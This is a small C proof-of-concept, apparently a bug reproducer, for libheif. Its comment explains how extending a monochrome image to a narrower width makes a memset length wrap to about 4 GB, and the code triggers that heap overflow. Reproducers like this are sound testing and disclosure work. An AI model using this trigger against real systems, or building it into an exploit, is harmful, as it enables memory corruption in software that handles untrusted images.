/*
 * Probe: heif_image_extend_to_size_fill_with_zero() on a monochrome image.
 *
 * Builds the smallest legal image through the public pixel API (create +
 * add_plane, 8-bit luma plane matching the image size) and then extends the
 * image to a narrower width. The per-row right-edge fill in
 * HeifPixelImage::extend_to_size_with_zero() computes its memset length as
 * bytes_per_pixel * (subsampled_width - old_width); with no shrink rejection
 * in front of it, the subtraction wraps to ~4 GB and the memset runs off the
 * end of the plane.
 */
#include <stdio.h>
#include <libheif/heif.h>

int main(void)
{
    heif_image* img = NULL;

    heif_error err = heif_image_create(64, 8,
                                       heif_colorspace_monochrome,
                                       heif_chroma_monochrome,
                                       &img);
    if (err.code != heif_error_Ok) {
        fprintf(stderr, "create failed\n");
        return 1;
    }

    err = heif_image_add_plane(img, heif_channel_Y, 64, 8, 8);
    if (err.code != heif_error_Ok) {
        fprintf(stderr, "add_plane failed\n");
        heif_image_release(img);
        return 1;
    }

    err = heif_image_extend_to_size_fill_with_zero(img, 1, 8);
    printf("extend returned %d/%d\n", err.code, err.subcode);

    heif_image_release(img);
    return 0;
}
